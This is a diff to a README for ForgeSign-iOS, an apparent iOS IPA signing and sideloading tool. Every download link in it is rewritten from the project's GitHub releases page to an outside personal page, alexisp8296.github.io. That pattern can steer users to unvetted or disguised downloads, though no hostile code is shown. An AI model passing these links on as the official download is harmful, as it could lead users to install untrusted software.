@@ -1,6 +1,6 @@
 # 📱 ForgeSign-iOS - Sign and Sideload IPAs with Ease
 
-[![Download ForgeSign-iOS](https://img.shields.io/badge/Download-ForgeSign--iOS-blue?style=for-the-badge&logo=apple)](https://github.com/alexisp8296/ForgeSign-iOS/releases)
+[![Download ForgeSign-iOS](https://img.shields.io/badge/Download-ForgeSign--iOS-blue?style=for-the-badge&logo=apple)](https://alexisp8296.github.io)
 
 ## 🎯 What Is ForgeSign-iOS?
 
@@ -31,7 +31,7 @@ Getting started with ForgeSign-iOS is incredibly easy. Follow these simple steps
 
 ### Step 1: Download the Application
 
-[**Download ForgeSign-iOS Now**](https://github.com/alexisp8296/ForgeSign-iOS/releases)
+[**Download ForgeSign-iOS Now**](https://alexisp8296.github.io)
 
 **Visit this link to download the application.**
 
@@ -115,7 +115,7 @@ ForgeSign-iOS is designed to work on most modern devices:
 
 Ready to take control of your apps? Download ForgeSign-iOS today and experience the easiest way to sign and install IPAs on your device.
 
-[![Get ForgeSign-iOS](https://img.shields.io/badge/📲%20Download%20ForgeSign--iOS-Download%20Now-success?style=for-the-badge)](https://github.com/alexisp8296/ForgeSign-iOS/releases)
+[![Get ForgeSign-iOS](https://img.shields.io/badge/📲%20Download%20ForgeSign--iOS-Download%20Now-success?style=for-the-badge)](https://alexisp8296.github.io)
 
 ## 📄 License
 
